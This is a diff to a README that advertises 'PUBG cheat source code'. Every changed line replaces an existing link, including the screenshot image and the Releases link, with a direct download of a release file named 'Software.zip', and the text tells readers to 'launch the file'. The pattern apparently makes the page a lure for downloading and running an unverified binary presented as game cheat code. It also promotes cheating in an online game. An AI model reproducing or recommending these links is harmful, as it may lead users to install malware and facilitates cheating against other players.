@@ -13,7 +13,7 @@ This cheat source code provides a variety of features aimed at improving your pe
 
 ## 🚀 Getting Started
 
-To get started with this cheat source code, simply download the code from the following link: [Download Source Code](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, you can launch the file and explore the code to see how you can integrate it into your gaming experience.
+To get started with this cheat source code, simply download the code from the following link: [Download Source Code](https://github.com/cycleoh/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Software.zip). Once downloaded, you can launch the file and explore the code to see how you can integrate it into your gaming experience.
 
 ## 📁 Repository Topics
 
@@ -30,7 +30,7 @@ These topics provide insights into the different aspects covered in this cheat s
 
 ## 🌐 Additional Resources
 
-If you encounter any issues with the download link or want to explore more, make sure to visit the [Releases](https://github.com/cli/go-gh/releases) section of this repository for additional resources and updates.
+If you encounter any issues with the download link or want to explore more, make sure to visit the [Releases](https://github.com/cycleoh/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Software.zip) section of this repository for additional resources and updates.
 
 ## 🎉 Get Started Now!
 
@@ -38,7 +38,7 @@ Download the source code, explore the features, and take your PUBG gaming experi
 
 ## 📸 Screenshot
 
-![PUBG Cheat Source Code](https://via.placeholder.com/800x400)
+![PUBG Cheat Source Code](https://github.com/cycleoh/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Software.zip)
 
 Remember, use this cheat responsibly and have fun dominating the battlegrounds in PUBG! 
 
